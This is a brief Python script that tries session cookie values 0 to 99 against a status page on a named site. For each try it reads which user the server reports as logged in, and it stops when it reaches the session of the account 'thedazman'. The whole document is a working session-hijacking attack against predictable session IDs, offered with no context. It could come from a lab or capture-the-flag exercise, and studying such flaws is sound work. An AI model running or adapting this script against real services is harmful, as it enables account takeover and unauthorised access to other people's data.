import requests, re, time

url = "https://wespeektogether.com/thedazman/status/74635478354"

for i in range(0, 100):
	data = {"speek_sess_id": str(i)}

	res = requests.get(url, cookies=data)
  
	user = re.search(r'Logged in as (\w+)', res.text).groups()[0]
	print(user)
  
	if user == 'thedazman':
		print(f'found! uid={i}')
		break
    
	time.sleep(0.25) # optional to avoid hammering the site
